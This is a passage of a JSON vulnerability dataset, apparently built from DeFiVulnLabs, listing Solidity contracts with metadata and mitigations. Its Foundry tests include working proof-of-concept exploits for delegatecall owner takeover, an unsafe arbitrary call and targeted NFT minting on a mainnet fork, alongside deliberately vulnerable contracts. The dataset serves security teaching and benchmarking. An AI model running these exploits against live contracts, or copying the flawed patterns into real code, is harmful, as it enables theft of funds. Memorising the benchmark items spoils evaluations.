    "vulnerable_contract_only": "contract VulnPermit {\n    IERC20 public token;\n\n    constructor(IERC20 _token) {\n        token = _token;\n    }\n\n    function deposit(uint256 amount) public {\n        require(\n            token.transferFrom(msg.sender, address(this), amount),\n            \"Transfer failed\"\n        );\n    }\n\n    function depositWithPermit(\n        address target,\n        uint256 amount,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) public {\n        (bool success, ) = address(token).call(\n            abi.encodeWithSignature(\n                \"permit(address,uint256,uint8,bytes32,bytes32)\",\n                target,\n                amount,\n                v,\n                r,\n                s\n            )\n        );\n        require(success, \"Permit failed\");\n\n        require(\n            token.transferFrom(target, address(this), amount),\n            \"Transfer failed\"\n        );\n    }\n\n    function withdraw(uint256 amount) public {\n        require(token.transfer(msg.sender, amount), \"Transfer failed\");\n    }\n}\n\n// ",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "logic_error",
    "severity": "medium",
    "difficulty_tier": 3,
    "vulnerability_name": "Phantom function - Permit Function",
    "description": "Phantom function: Accepts any call to a function that it doesn't actually define, without reverting.\nkey:\n1.Token that does not support EIP-2612 permit. \n2.Token has a fallback function.\nFor example: WETH.",
    "scenario": "",
    "fix_description": "Use SafeERC20's safePermit - Revert on invalid signature.\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/utils/SafeERC20.sol#LL89C14-L89C24",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": false,
    "context_level": "intra_contract",
    "original_source_path": "src/test/phantom-permit.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_returnvalue",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "Returnvalue.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\n\n/*\nName: Unchecked return value\n\nDescription:\nEIP20 standard:\nReturns a boolean value indicating whether the operation succeeded.\nfunction transfer(address to, uint256 amount) external returns (bool);\n\nUSDT doesn't correctly implement the EIP20 standard,\nso calling these functions with the correct EIP20 function signatures will always revert.\nfunction transfer(address to, uint256 value) external;\n\nERC20 transfer:\n    function transfer(address to, uint256 amount) public virtual returns (bool) {\n        address owner = _msgSender();\n        _transfer(owner, to, amount);\n        return true;\n    }\n\nUSDT transfer without a return value:\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\n        ...\n        }\n        Transfer(msg.sender, _to, sendAmount);\n    }\n\nMitigation:\nUse OpenZeppelin\u2019s\u00a0SafeERC20\u00a0library and change\u00a0transfer\u00a0to\u00a0safeTransfer.\n\nREF:\nhttps://twitter.com/1nf0s3cpt/status/1600868995007410176\n\n*/\ninterface USDT {\n    function transfer(address to, uint256 value) external;\n\n    function balanceOf(address account) external view returns (uint256);\n\n    function approve(address spender, uint256 value) external;\n}\n\ncontract ContractTest is Test {\n    using SafeERC20 for IERC20;\n    IERC20 constant usdt = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);\n\n    function setUp() public {\n        vm.createSelectFork(\"mainnet\", 16138254);\n    }\n\n    function testTransfer() public {\n        vm.startPrank(0xef0DCc839c1490cEbC7209BAa11f46cfe83805ab);\n        usdt.transfer(address(this), 123); //revert\n        vm.stopPrank();\n    }\n\n    function testSafeTransfer() public {\n        vm.startPrank(0xef0DCc839c1490cEbC7209BAa11f46cfe83805ab);\n        usdt.safeTransfer(address(this), 123);\n        vm.stopPrank();\n    }\n\n    receive() external payable {}\n}\n",
    "vulnerable_contract_only": "see full file",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "logic_error",
    "severity": "medium",
    "difficulty_tier": 3,
    "vulnerability_name": "Unchecked return value",
    "description": "EIP20 standard:\nReturns a boolean value indicating whether the operation succeeded.\nfunction transfer(address to, uint256 amount) external returns (bool);\n\nUSDT doesn't correctly implement the EIP20 standard,\nso calling these functions with the correct EIP20 function signatures will always revert.\nfunction transfer(address to, uint256 value) external;\n\nERC20 transfer:\n    function transfer(address to, uint256 amount) public virtual returns (bool) {\n        address owner = _msgSender();\n        _transfer(owner, to, amount);\n        return true;\n    }\n\nUSDT transfer without a return value:\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\n        ...\n        }\n        Transfer(msg.sender, _to, sendAmount);\n    }",
    "scenario": "",
    "fix_description": "Use OpenZeppelin\u2019s\u00a0SafeERC20\u00a0library and change\u00a0transfer\u00a0to\u00a0safeTransfer.",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": false,
    "context_level": "intra_contract",
    "original_source_path": "src/test/Returnvalue.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_delegatecall",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "Delegatecall.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: Unsafe Delegatecall Vulnerability\n\nDescription:\nThe Proxy Contract Owner Manipulation Vulnerability is a flaw in the smart contract design that\nallows an attacker to manipulate the owner of the Proxy contract, which is hardcoded as 0xdeadbeef.\nThe vulnerability arises due to the use of delegatecall in the fallback function of the Proxy contract. \ndelegatecall allows an attacker to invoke the pwn() function from the Delegate contract within the context \nof the Proxy contract, thereby changing the value of the owner state variable of the Proxy contract.\nThis allows a smart contract to dynamically load code from a different address at runtime.\n\nScenario:\nProxy Contract is designed for helping users call logic contract\nProxy Contract's owner is hardcoded as 0xdeadbeef\nCan you manipulate Proxy Contract's owner ?\n\nMitigation:\nTo mitigate the Proxy Contract Owner Manipulation Vulnerability, \navoid using delegatecall unless it is explicitly required, and ensure that the delegatecall is used securely. \nIf the delegatecall is necessary for the contract's functionality, make sure to validate and \nsanitize inputs to avoid unexpected behaviors.\n*/\n \ncontract Proxy {\n    address public owner = address(0xdeadbeef); // slot0\n    Delegate delegate;\n\n    constructor(address _delegateAddress) public {\n        delegate = Delegate(_delegateAddress);\n    }\n\n    fallback() external {\n        (bool suc, ) = address(delegate).delegatecall(msg.data); // vulnerable\n        require(suc, \"Delegatecall failed\");\n    }\n}\n\ncontract ContractTest is Test {\n    Proxy proxy;\n    Delegate DelegateContract;\n    address alice;\n\n    function setUp() public {\n        alice = vm.addr(1);\n    }\n\n    function testDelegatecall() public {\n        DelegateContract = new Delegate(); // logic contract\n        proxy = new Proxy(address(DelegateContract)); // proxy contract\n\n        console.log(\"Alice address\", alice);\n        console.log(\"DelegationContract owner\", proxy.owner());\n\n        // Delegatecall allows a smart contract to dynamically load code from a different address at runtime.\n        console.log(\"Change DelegationContract owner to Alice...\");\n        vm.prank(alice);\n        address(proxy).call(abi.encodeWithSignature(\"pwn()\")); // exploit here\n        // Proxy.fallback() will delegatecall Delegate.pwn()\n\n        console.log(\"DelegationContract owner\", proxy.owner());\n        console.log(\n            \"Exploit completed, proxy contract storage has been manipulated\"\n        );\n    }\n}\n\ncontract Delegate {\n    address public owner; // slot0\n\n    function pwn() public {\n        owner = msg.sender;\n    }\n}\n",
    "vulnerable_contract_only": "contract Proxy {\n    address public owner = address(0xdeadbeef); // slot0\n    Delegate delegate;\n\n    constructor(address _delegateAddress) public {\n        delegate = Delegate(_delegateAddress);\n    }\n\n    fallback() external {\n        (bool suc, ) = address(delegate).delegatecall(msg.data); // vulnerable\n        require(suc, \"Delegatecall failed\");\n    }\n}\n\n",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "delegatecall_injection",
    "severity": "critical",
    "difficulty_tier": 3,
    "vulnerability_name": "Unsafe Delegatecall Vulnerability",
    "description": "The Proxy Contract Owner Manipulation Vulnerability is a flaw in the smart contract design that\nallows an attacker to manipulate the owner of the Proxy contract, which is hardcoded as 0xdeadbeef.\nThe vulnerability arises due to the use of delegatecall in the fallback function of the Proxy contract. \ndelegatecall allows an attacker to invoke the pwn() function from the Delegate contract within the context \nof the Proxy contract, thereby changing the value of the owner state variable of the Proxy contract.\nThis allows a smart contract to dynamically load code from a different address at runtime.",
    "scenario": "Proxy Contract is designed for helping users call logic contract\nProxy Contract's owner is hardcoded as 0xdeadbeef\nCan you manipulate Proxy Contract's owner ?",
    "fix_description": "To mitigate the Proxy Contract Owner Manipulation Vulnerability, \navoid using delegatecall unless it is explicitly required, and ensure that the delegatecall is used securely. \nIf the delegatecall is necessary for the contract's functionality, make sure to validate and \nsanitize inputs to avoid unexpected behaviors.",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": false,
    "context_level": "intra_contract",
    "original_source_path": "src/test/Delegatecall.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_return-break",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "return-break.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: Use of return in inner loop iteration leads to unintended termination. \n\nDescription:\nThis demonstrates the difference between using 'return' and 'break' in nested loop iterations.\nWhen removing multiple banks from a list, using 'return' in the BuggyBankManager will prematurely exit the function\nafter removing only the first bank, leaving other banks untouched.\nIn contrast, the FixedBankManager uses 'break' correctly to only exit the current inner loop iteration,\nallowing the outer loop to continue processing other banks.\n\nThis is similar to a real bug where a function intended to allow the removal of multiple DEXes approved for swaps,\nbut would only remove the first DEX because 'return' was used instead of 'break' in the inner for loop.\n\nMitigation:  \nUse break instead of return when you only want to exit the current loop, not the entire function.\n\nREF:\nhttps://twitter.com/1nf0s3cpt/status/1678596730865221632\nhttps://github.com/code-423n4/2022-03-lifinance-findings/issues/34\nhttps://solidity-by-example.org/loop/\n*/\n\ncontract ContractTest is Test {\n    BuggyBankManager buggyManager;\n    FixedBankManager fixedManager;\n\n    function setUp() public {\n        buggyManager = new BuggyBankManager();\n        fixedManager = new FixedBankManager();\n        \n        // Initialize both managers with the same 3 banks\n        address[] memory initialBanks = new address[](3);\n        string[] memory initialNames = new string[](3);\n        \n        initialBanks[0] = address(0x1);\n        initialNames[0] = \"ABC Bank\";\n        \n        initialBanks[1] = address(0x2);\n        initialNames[1] = \"XYZ Bank\";\n        \n        initialBanks[2] = address(0x3);\n        initialNames[2] = \"Global Bank\";\n        \n        buggyManager.addBanks(initialBanks, initialNames);\n        fixedManager.addBanks(initialBanks, initialNames);\n        \n        // Verify initial state\n        emit log_string(\"Initial state of both bank managers:\");\n        emit log_named_uint(\"Buggy manager bank count\", buggyManager.getBankCount());\n        emit log_named_uint(\"Fixed manager bank count\", fixedManager.getBankCount());\n    }\n\n    function testReturnVsBreak() public {\n        // Try to remove all banks marked for removal\n        emit log_string(\"\\nRemoving banks marked for removal\");\n        \n        // Mark all banks for removal\n        address[] memory banksToRemove = new address[](3);\n        banksToRemove[0] = address(0x1); // ABC Bank\n        banksToRemove[1] = address(0x2); // XYZ Bank\n        banksToRemove[2] = address(0x3); // Global Bank\n        console.log(\"------------Testing buggyManager---------------\");\n        // With buggy implementation (using return)\n        buggyManager.removeBanksWithReturn(banksToRemove);\n        emit log_named_uint(\"Buggy manager (with return) bank count after removal\", buggyManager.getBankCount());\n        buggyManager.listBanks();\n\n        console.log(\"------------Testing FixedBankManager---------------\");\n        // With fixed implementation (using break)\n        fixedManager.removeBanksWithBreak(banksToRemove);\n        emit log_named_uint(\"Fixed manager (with break) bank count after removal\", fixedManager.getBankCount());\n        fixedManager.listBanks();\n    }\n}\n\n// Base contract with common functionality\ncontract BankManager {\n    struct Bank {\n        address bankAddress;\n        string bankName;\n    }\n\n    Bank[] public banks;\n    \n    // Add multiple banks\n    function addBanks(address[] memory addresses, string[] memory names) public {\n        require(addresses.length == names.length, \"Arrays must have the same length\");\n        \n        for (uint i = 0; i < addresses.length; i++) {\n            banks.push(Bank(addresses[i], names[i]));\n        }\n    }\n    \n    // Get the number of banks\n    function getBankCount() public view returns (uint) {\n        return banks.length;\n    }\n    \n    // Get a specific bank\n    function getBank(uint index) public view returns (address, string memory) {\n        require(index < banks.length, \"Index out of bounds\");\n        return (banks[index].bankAddress, banks[index].bankName);\n    }\n    \n    // Helper function to remove a bank at a specific index\n    function _removeBank(uint index) internal {\n        require(index < banks.length, \"Index out of bounds\");\n        \n        // Move the last element to the deleted position\n        if (index < banks.length - 1) {\n            banks[index] = banks[banks.length - 1];\n        }\n        \n        // Remove the last element\n        banks.pop();\n    }\n}\n\n// Buggy implementation using 'return' incorrectly\ncontract BuggyBankManager is BankManager, Test {\n    // Remove all banks in the provided list\n    // BUG: Using 'return' causes premature exit after removing only one bank\n    function removeBanksWithReturn(address[] memory banksToRemove) public {\n        for (uint i = 0; i < banks.length; i++) {\n            for (uint j = 0; j < banksToRemove.length; j++) {\n                if (banks[i].bankAddress == banksToRemove[j]) {\n                    emit log_string(string(abi.encodePacked(\n                        \"Removing bank: \", banks[i].bankName, \n                        \" (Address: \", toHexString(uint160(banks[i].bankAddress)), \")\"\n                    )));\n                    \n                    _removeBank(i);\n                    return; // BUG: This exits the entire function after removing just one bank\n                }\n            }\n        }\n    }\n    \n    // Helper function to list all banks in this manager\n    function listBanks() public {\n        emit log_string(\"Banks in buggy manager:\");\n        for (uint i = 0; i < banks.length; i++) {\n            emit log_string(string(abi.encodePacked(\n                \"Bank \", toString(i), \": \", \n                banks[i].bankName, \" (Address: \", \n                toHexString(uint160(banks[i].bankAddress)), \")\"\n            )));\n        }\n    }\n    \n    // Helper function to convert uint to string\n    function toString(uint value) internal pure returns (string memory) {\n        if (value == 0) {\n            return \"0\";\n        }\n        uint temp = value;\n        uint digits;\n        while (temp != 0) {\n            digits++;\n            temp /= 10;\n        }\n        bytes memory buffer = new bytes(digits);\n        while (value != 0) {\n            digits -= 1;\n            buffer[digits] = bytes1(uint8(48 + uint(value % 10)));\n            value /= 10;\n        }\n        return string(buffer);\n    }\n    \n    // Helper function to convert address to hex string\n    function toHexString(uint value) internal pure returns (string memory) {\n        bytes16 hexSymbols = \"0123456789abcdef\";\n        uint length = 40; // 20 bytes * 2 characters per byte\n        bytes memory buffer = new bytes(2 + length);\n        buffer[0] = '0';\n        buffer[1] = 'x';\n        for (uint i = 2 + length - 1; i >= 2; i--) {\n            buffer[i] = hexSymbols[value & 0xf];\n            value >>= 4;\n        }\n        return string(buffer);\n    }\n}\n\n// Fixed implementation using proper iteration\ncontract FixedBankManager is BankManager, Test {\n    // Remove all banks in the provided list\n    // FIXED: Using proper iteration to remove multiple elements\n    function removeBanksWithBreak(address[] memory banksToRemove) public {\n        // We need to iterate backwards to avoid index issues when removing elements\n        for (int i = int(banks.length) - 1; i >= 0; i--) {\n            for (uint j = 0; j < banksToRemove.length; j++) {\n                if (banks[uint(i)].bankAddress == banksToRemove[j]) {\n                    emit log_string(string(abi.encodePacked(\n                        \"Removing bank: \", banks[uint(i)].bankName, \n                        \" (Address: \", toHexString(uint160(banks[uint(i)].bankAddress)), \")\"\n                    )));\n                    \n                    _removeBank(uint(i));\n                    break; // FIXED: Only break from the inner loop, continue with the next bank\n                }\n            }\n        }\n    }\n    \n    // Helper function to list all banks in this manager\n    function listBanks() public {\n        emit log_string(\"Banks in fixed manager:\");\n        for (uint i = 0; i < banks.length; i++) {\n            emit log_string(string(abi.encodePacked(\n                \"Bank \", toString(i), \": \", \n                banks[i].bankName, \" (Address: \", \n                toHexString(uint160(banks[i].bankAddress)), \")\"\n            )));\n        }\n    }\n    \n    // Helper function to convert uint to string\n    function toString(uint value) internal pure returns (string memory) {\n        if (value == 0) {\n            return \"0\";\n        }\n        uint temp = value;\n        uint digits;\n        while (temp != 0) {\n            digits++;\n            temp /= 10;\n        }\n        bytes memory buffer = new bytes(digits);\n        while (value != 0) {\n            digits -= 1;\n            buffer[digits] = bytes1(uint8(48 + uint(value % 10)));\n            value /= 10;\n        }\n        return string(buffer);\n    }\n    \n    // Helper function to convert address to hex string\n    function toHexString(uint value) internal pure returns (string memory) {\n        bytes16 hexSymbols = \"0123456789abcdef\";\n        uint length = 40; // 20 bytes * 2 characters per byte\n        bytes memory buffer = new bytes(2 + length);\n        buffer[0] = '0';\n        buffer[1] = 'x';\n        for (uint i = 2 + length - 1; i >= 2; i--) {\n            buffer[i] = hexSymbols[value & 0xf];\n            value >>= 4;\n        }\n        return string(buffer);\n    }\n}\n",
    "vulnerable_contract_only": "contract BankManager {\n    struct Bank {\n        address bankAddress;\n        string bankName;\n    }\n\n    Bank[] public banks;\n    \n    // Add multiple banks\n    function addBanks(address[] memory addresses, string[] memory names) public {\n        require(addresses.length == names.length, \"Arrays must have the same length\");\n        \n        for (uint i = 0; i < addresses.length; i++) {\n            banks.push(Bank(addresses[i], names[i]));\n        }\n    }\n    \n    // Get the number of banks\n    function getBankCount() public view returns (uint) {\n        return banks.length;\n    }\n    \n    // Get a specific bank\n    function getBank(uint index) public view returns (address, string memory) {\n        require(index < banks.length, \"Index out of bounds\");\n        return (banks[index].bankAddress, banks[index].bankName);\n    }\n    \n    // Helper function to remove a bank at a specific index\n    function _removeBank(uint index) internal {\n        require(index < banks.length, \"Index out of bounds\");\n        \n        // Move the last element to the deleted position\n        if (index < banks.length - 1) {\n            banks[index] = banks[banks.length - 1];\n        }\n        \n        // Remove the last element\n        banks.pop();\n    }\n}\n\n// Buggy implementation using 'return' incorrectly\n",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "logic_error",
    "severity": "medium",
    "difficulty_tier": 3,
    "vulnerability_name": "Use of return in inner loop iteration leads to unintended termination.",
    "description": "This demonstrates the difference between using 'return' and 'break' in nested loop iterations.\nWhen removing multiple banks from a list, using 'return' in the BuggyBankManager will prematurely exit the function\nafter removing only the first bank, leaving other banks untouched.\nIn contrast, the FixedBankManager uses 'break' correctly to only exit the current inner loop iteration,\nallowing the outer loop to continue processing other banks.\n\nThis is similar to a real bug where a function intended to allow the removal of multiple DEXes approved for swaps,\nbut would only remove the first DEX because 'return' was used instead of 'break' in the inner for loop.",
    "scenario": "",
    "fix_description": "Use break instead of return when you only want to exit the current loop, not the entire function.",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": true,
    "context_level": "intra_contract",
    "original_source_path": "src/test/return-break.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_nftmint_exposedmetadata",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "NFTMint_exposedMetadata.sol",
    "file_content": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n/*\nName: NFT Mint via Exposed Metadata Vulnerability\n\nDescription:\nThe contract is vulnerable to CVE-2022-38217, this could lead to the early disclosure of metadata of all NFTs in the project. \nAs a result, attacker can find out valuable NFTs and then target mint of specific NFTs by monitoring mempool \nand sell the NFTs for a profit in secondary market.\n\nThe issue is the metadata should be visible after the minting is completed\n\nREF:\nhttps://twitter.com/Supremacy_CA/status/1596176732729769985\nhttps://medium.com/@Supremacy_Official/evilreveal-cve-2022-38217-a-nuclear-weapon-level-generic-vulnerability-buried-under-the-nft-5112724dabb\n*/\n \n\ncontract ContractTest is DSTest {\n    IFantasticWeslie nftContract =\n        IFantasticWeslie(0xf6FFBa463e46087FcdC3a51391bB675B0e2C1a40); // Fantastic Weslie\n\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    bytes32[] merkleTreeProof;\n\n    function setUp() public {\n        cheats.createSelectFork(\"mainnet\", 16023847);\n    }\n\n    function testExploit() public {\n        //Since the contract is vulnerable to CVE-2022-38217\n        //it could lead to the early disclosure of metadata of all NFTs in the project\n        //As a result, attacker can find out valuable NFTs and then target mint specified NFTs by monitoring Mempool and sell the NFTs for a profit in secondary market\n\n        //For example, Lets assume the attacker finds out that NFT#142 is a rare NFT, now he just has to moniter the mempool till NFT#141 is minted and then mint NFT#142\n        //View Metadata of the NFTs via cURL -> curl -k https://bafybeic23x4v75z7isyqhy5p6ylzqutm6lnpobwngaouovdu6qjjvt4wpu.ipfs.dweb.link/142.json\n        //The issue is the metadata should be visible after the minting is completed\n\n        //etherscan tx - 0xfa4434236d2a9717e3410d7cdc60eed6acfddb054f58bc779c07349a1f45ce6b\n        //etherscan tx - 0x24af97355f6cec4ae02fff8bbf7144a02857e3ffd36a650aa295c62f6272cc83\n\n        address attacker = 0x1fCebBb5D3EACd26e70b0BD1E54a979a479906aA;\n        cheats.prank(attacker);\n\n        merkleTreeProof.push(\n            0x0ea49bae9ab4f8b82fb0e0b5e876576c9a4a945edc2fa5a7b448fad470802ae6\n        );\n        merkleTreeProof.push(\n            0x852233af3700b87dc51f6abf53d4f935746d746d84a33d4d7e6302d9c110fedd\n        );\n        merkleTreeProof.push(\n            0x5de513269badb3a0b73e237a9f28f86994791f4421effd1865df975a0f8ee52c\n        );\n        merkleTreeProof.push(\n            0xe52d780f15394a8f6254f328ca06a66909c41f1ee3adab33d02cd087f8c37604\n        );\n        merkleTreeProof.push(\n            0xede88505e4259ab482a1019cc8d4364cf9e1e7866768245854c0f6e369d2b08c\n        );\n        merkleTreeProof.push(\n            0x776fee48d9285a8e2d1ecde47354e9ebe91b10f0b5f2d754968af831a7047808\n        );\n        merkleTreeProof.push(\n            0x3d13c4757d9e35123b8785040c29f232483941fb7d591b1a94167c1ca5e8875f\n        );\n        merkleTreeProof.push(\n            0xc36c091c358833709f1b6f44e783e5d9ad5ad9f5f0ee09a37c376fd354827fb1\n        );\n        merkleTreeProof.push(\n            0xce26991b2af9fc0fb807aea36667d37439ae7122d3ea8edcbfe92b04bf674922\n        );\n        merkleTreeProof.push(\n            0x8452c207732923a758c53fb296f3d88340a04fe9c381c73ba44343a45340953e\n        );\n        merkleTreeProof.push(\n            0xcc44822b3b5a19839899f6795622daff3bab327895558977ea58a30a42c6a49e\n        );\n        merkleTreeProof.push(\n            0x45c575962e5a88b5e8c3aedf4e3e74306d0124f4cc86c25bc4cd1bcae16c54a0\n        );\n\n        nftContract.mint{value: 0.12 ether}(merkleTreeProof);\n\n        console.log(\"Owner of NFT#142 : \", nftContract.ownerOf(142));\n    }\n}\n",
    "vulnerable_contract_only": "see full file",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "logic_error",
    "severity": "medium",
    "difficulty_tier": 3,
    "vulnerability_name": "NFT Mint via Exposed Metadata Vulnerability",
    "description": "The contract is vulnerable to CVE-2022-38217, this could lead to the early disclosure of metadata of all NFTs in the project. \nAs a result, attacker can find out valuable NFTs and then target mint of specific NFTs by monitoring mempool \nand sell the NFTs for a profit in secondary market.\n\nThe issue is the metadata should be visible after the minting is completed",
    "scenario": "",
    "fix_description": "",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": false,
    "context_level": "intra_contract",
    "original_source_path": "src/test/NFTMint_exposedMetadata.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_unsafecall",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "UnsafeCall.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\n/*\nName: Unsafe Call Vulnerability\n\nDescription:\nIn TokenWhale contract's approveAndCallcode function. The vulnerability allows an \narbitrary call to be executed with arbitrary data, leading to potential security risks\nand unintended consequences. The function uses a low-level call (_spender.call(_extraData))\nto execute code from the _spender address without any validation or checks on the provided _extraData.\nThis can lead to unexpected behavior, reentrancy attacks, or unauthorized operations.\n\nThis excersise is about  a low level call to a contract where input and return values are not checked\nIf the call data is controllable, it is easy to cause arbitrary function execution.\n\nMitigation:\nUse of low level \"call\" should be avoided whenever possible.  \n\nREF\nhttps://blog.li.fi/20th-march-the-exploit-e9e1c5c03eb9\n*/\n\nimport \"forge-std/Test.sol\";\n\ncontract ContractTest is Test {\n    TokenWhale TokenWhaleContract;\n\n    function testUnsafeCall() public {\n        address alice = vm.addr(1);\n        TokenWhaleContract = new TokenWhale();\n        TokenWhaleContract.TokenWhaleDeploy(address(TokenWhaleContract));\n        console.log(\n            \"TokenWhale balance:\",\n            TokenWhaleContract.balanceOf(address(TokenWhaleContract))\n        );\n\n        // bytes memory payload = abi.encodeWithSignature(\"transfer(address,uint256)\",address(alice),1000);\n\n        console.log(\n            \"Alice tries to perform unsafe call to transfer asset from TokenWhaleContract\"\n        );\n        vm.prank(alice);\n        TokenWhaleContract.approveAndCallcode(\n            address(TokenWhaleContract),\n            0x1337, // doesn't affect the exploit\n            abi.encodeWithSignature(\n                \"transfer(address,uint256)\",\n                address(alice),\n                1000\n            )\n        );\n\n        // check if the exploit is successful\n        assertEq(TokenWhaleContract.balanceOf(address(alice)), 1000);\n        console.log(\"Exploit completed\");\n        console.log(\n            \"TokenWhale balance:\",\n            TokenWhaleContract.balanceOf(address(TokenWhaleContract))\n        );\n        console.log(\n            \"Alice balance:\",\n            TokenWhaleContract.balanceOf(address(alice))\n        );\n    }\n\n    receive() external payable {}\n}\n\ncontract TokenWhale {\n    address player;\n\n    uint256 public totalSupply;\n    mapping(address => uint256) public balanceOf;\n    mapping(address => mapping(address => uint256)) public allowance;\n\n    string public name = \"Simple ERC20 Token\";\n    string public symbol = \"SET\";\n    uint8 public decimals = 18;\n\n    function TokenWhaleDeploy(address _player) public {\n        player = _player;\n        totalSupply = 1000;\n        balanceOf[player] = 1000;\n    }\n\n    function isComplete() public view returns (bool) {\n        return balanceOf[player] >= 1000000; // 1 mil\n    }\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    function _transfer(address to, uint256 value) internal {\n        balanceOf[msg.sender] -= value;\n        balanceOf[to] += value;\n\n        emit Transfer(msg.sender, to, value);\n    }\n\n    function transfer(address to, uint256 value) public {\n        require(balanceOf[msg.sender] >= value);\n        require(balanceOf[to] + value >= balanceOf[to]);\n\n        _transfer(to, value);\n    }\n\n    event Approval(\n        address indexed owner,\n        address indexed spender,\n        uint256 value\n    );\n\n    function approve(address spender, uint256 value) public {\n        allowance[msg.sender][spender] = value;\n        emit Approval(msg.sender, spender, value);\n    }\n\n    function transferFrom(address from, address to, uint256 value) public {\n        require(balanceOf[from] >= value);\n        require(balanceOf[to] + value >= balanceOf[to]);\n        require(allowance[from][msg.sender] >= value);\n\n        allowance[from][msg.sender] -= value;\n        _transfer(to, value);\n    }\n\n    /* Approves and then calls the contract code*/\n\n    function approveAndCallcode(\n        address _spender,\n        uint256 _value,\n        bytes memory _extraData\n    ) public {\n        allowance[msg.sender][_spender] = _value;\n\n        bool success;\n        // vulnerable call execute unsafe user code\n        (success, ) = _spender.call(_extraData);\n        console.log(\"success:\", success);\n    }\n}\n",
    "vulnerable_contract_only": "contract TokenWhale {\n    address player;\n\n    uint256 public totalSupply;\n    mapping(address => uint256) public balanceOf;\n    mapping(address => mapping(address => uint256)) public allowance;\n\n    string public name = \"Simple ERC20 Token\";\n    string public symbol = \"SET\";\n    uint8 public decimals = 18;\n\n    function TokenWhaleDeploy(address _player) public {\n        player = _player;\n        totalSupply = 1000;\n        balanceOf[player] = 1000;\n    }\n\n    function isComplete() public view returns (bool) {\n        return balanceOf[player] >= 1000000; // 1 mil\n    }\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    function _transfer(address to, uint256 value) internal {\n        balanceOf[msg.sender] -= value;\n        balanceOf[to] += value;\n\n        emit Transfer(msg.sender, to, value);\n    }\n\n    function transfer(address to, uint256 value) public {\n        require(balanceOf[msg.sender] >= value);\n        require(balanceOf[to] + value >= balanceOf[to]);\n\n        _transfer(to, value);\n    }\n\n    event Approval(\n        address indexed owner,\n        address indexed spender,\n        uint256 value\n    );\n\n    function approve(address spender, uint256 value) public {\n        allowance[msg.sender][spender] = value;\n        emit Approval(msg.sender, spender, value);\n    }\n\n    function transferFrom(address from, address to, uint256 value) public {\n        require(balanceOf[from] >= value);\n        require(balanceOf[to] + value >= balanceOf[to]);\n        require(allowance[from][msg.sender] >= value);\n\n        allowance[from][msg.sender] -= value;\n        _transfer(to, value);\n    }\n\n    /* Approves and then calls the ",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "unchecked_call",
    "severity": "medium",
    "difficulty_tier": 3,
    "vulnerability_name": "Unsafe Call Vulnerability",
    "description": "In TokenWhale contract's approveAndCallcode function. The vulnerability allows an \narbitrary call to be executed with arbitrary data, leading to potential security risks\nand unintended consequences. The function uses a low-level call (_spender.call(_extraData))\nto execute code from the _spender address without any validation or checks on the provided _extraData.\nThis can lead to unexpected behavior, reentrancy attacks, or unauthorized operations.\n\nThis excersise is about  a low level call to a contract where input and return values are not checked\nIf the call data is controllable, it is easy to cause arbitrary function execution.",
    "scenario": "",
    "fix_description": "Use of low level \"call\" should be avoided whenever possible.",
    "references": [
      "https://blog.li.fi/20th-march-the-exploit-e9e1c5c03eb9"
    ],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": false,
    "context_level": "intra_contract",
    "original_source_path": "src/test/UnsafeCall.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_slippage-deadline",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "Slippage-deadline.sol",
